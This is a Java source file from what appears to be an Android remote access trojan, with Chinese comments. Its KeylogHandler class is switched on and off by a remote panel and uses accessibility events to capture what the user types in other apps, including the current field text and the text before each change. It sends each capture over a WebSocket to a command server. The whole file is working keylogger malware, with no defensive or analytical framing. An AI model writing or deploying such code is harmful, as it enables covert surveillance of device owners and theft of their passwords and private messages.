package com.vendor.rat.control.handler;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.vendor.rat.network.NetworkManager;
import com.vendor.rat.network.WebSocketClient;

/**
 * Keylog 键盘监听处理器
 *
 * 对齐 vendor o/b0.java:100-108 + stat/KeyboardEventVO
 * Panel 命令: {type:"screencomd", subc:"Keylog", comdtype:"0"=开/"1"=关}
 * 设备回传: {subc:"klogs", msg:"[{app,text,before,time}]"}
 * Laravel DeviceHandler 转发: {type:"klog", data:"...", pid:"xxx"}
 */
public class KeylogHandler {

    private static final String TAG = "KeylogHandler";
    private static final String SUBC_KLOGS = "klogs";

    private volatile boolean enabled = false;

    /**
     * 处理 Panel 下发的 Keylog 开关命令
     * comdtype: "0"=开启, "1"=关闭
     */
    public void handle(JsonObject payload) {
        String comdtype = payload.has("comdtype") ? payload.get("comdtype").getAsString() : "";
        if ("0".equals(comdtype)) {
            enabled = true;
            Log.d(TAG, "keylog enabled");
        } else {
            enabled = false;
            Log.d(TAG, "keylog disabled");
        }
    }

    /**
     * 从 MyAccessibilityService.onAccessibilityEvent() 调用
     * 仅处理 TYPE_VIEW_TEXT_CHANGED 事件
     */
    public void onTextChanged(AccessibilityEvent event) {
        if (!enabled || event == null) return;

        String packageName = event.getPackageName() != null
                ? event.getPackageName().toString() : "";

        // 过滤自身包名和 systemui (对齐 vendor)
        if (packageName.equals("com.vendor.rat")
                || packageName.equals("com.android.systemui")) {
            return;
        }

        String className = event.getClassName() != null
                ? event.getClassName().toString() : "";

        // beforeText — 修改前文本 (仅 TYPE_VIEW_TEXT_CHANGED 有值)
        String beforeText = event.getBeforeText() != null
                ? event.getBeforeText().toString() : "";

        // editText — 当前输入框完整文本
        String editText = "";
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            if (source.getText() != null) {
                editText = source.getText().toString();
            }
            source.recycle();
        }

        // eventText — 事件文本列表逗号拼接
        String eventText = "";
        if (event.getText() != null && !event.getText().isEmpty()) {
            StringBuilder sb = new StringBuilder();
            for (CharSequence cs : event.getText()) {
                if (sb.length() > 0) sb.append(",");
                sb.append(cs);
            }
            eventText = sb.toString();
        }

        // 构建 JSON
        JsonObject entry = new JsonObject();
        entry.addProperty("app", packageName);
        entry.addProperty("cls", className);
        entry.addProperty("text", editText);
        entry.addProperty("before", beforeText);
        entry.addProperty("event", eventText);
        entry.addProperty("time", System.currentTimeMillis());

        JsonArray arr = new JsonArray();
        arr.add(entry);

        // 发送到 Laravel: subc="klogs" → DeviceHandler 转发为 type="klog"
        WebSocketClient ws = NetworkManager.getInstance().getWebSocketClient();
        if (ws != null) {
            ws.sendData(SUBC_KLOGS, arr.toString());
        }
    }

    public boolean isEnabled() {
        return enabled;
    }
}
